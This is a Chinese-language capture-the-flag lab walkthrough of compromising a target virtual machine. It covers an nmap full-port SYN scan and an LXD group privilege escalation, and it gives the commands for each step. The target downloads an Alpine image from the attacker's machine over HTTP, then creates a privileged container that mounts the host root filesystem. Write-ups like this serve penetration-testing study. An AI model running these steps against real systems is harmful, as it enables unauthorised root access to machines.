### 2.nmap进行靶机端口服务扫描

```
nmap -sS -Pn -A -p- -n 192.168.100.6
```

```
\-sS  SYN 扫描，半连接
\-Pn  跳过Ping扫描阶段
\-A   全面扫描
\-p-  全端口
\-n   禁止DNS反向解析，如果单纯扫描一段IP，该选项可以大幅度减少目标主机响应时间
```

可以看到靶机开放了21/ftp、22/ssh、80/http端口

![](../Images/4514b1aa22aefb650725e40a14fb2106.png)

##### （2）lxc提权

查看用户组的时候发现了一个可以提权漏洞：lxc提权

![](../Images/4cccab069c598261aed6f55e70daa059.png)

```

lxc是linux中自带的一个轻量级的容器，它执行一个root进程，通过适当的操作可以将lxd组中的成员提权为root，
```

提权分为两个步骤：

**首先kali端shell：**

```
git clone https://github.com/saghul/lxd-alpine-builder.git
```

![](../Images/06f100ce28d54f31105eb0574c1bb29b.png)

![](../Images/da31b8d8dd6f398cfae6a86eac1e3df6.png)

```

cd lxd-alpine-builder
```

![](../Images/976401eb38cbc826778c11fdefe736ab.png)

```
python -m SimpleHTTPServer   #调用SimpleHTTPServer快速传输文件
```

![](../Images/6a906e4b56c2a29f6a1865634efe784f.png)

**靶机端shell（感觉和docker的使用很相似）：**

```
wget http://192.168.100.4:8000/alpine-v3.16-x86\_64-20220705\_2113.tar.gz
```

![](../Images/694b36b66b96db540913e63cfe5c4aa7.png)

```
lxc image import ./alpine-v3.16-x86\_64-20220705\_2113.tar.gz --alias rock
```

![](../Images/0f723a92534e764705a82ebb873eae7a.png)

```
lxc image list
```

![](../Images/fdbeae77af7b786c9c9a3762b7484f9c.png)

```
lxd init   #初始化
```

![](../Images/d8600e4ff22488a6c723b3da8069eb6c.png)

```
lxc init rock shao -c security.privileged=true
```

![](../Images/379f9438a8c48beaeeec24a4029e3e30.png)

```
lxc config device add shao rock disk source=/ path=/mnt/root recursive=true
```

![](../Images/c1996e71c03b5cc297c37847a567cce7.png)

```


lxc start shao
```

![](../Images/1b8a13e829df7bdbd370b4d847e28083.png)

此次靶场通过信息收集目录扫描FTP匿名登陆获取敏感文件，利用john/fcrakzip进行破解密码，解压之后获取SSH私钥登陆SSHgetshell，利用信息收集获取账号密码之后进行提权操作
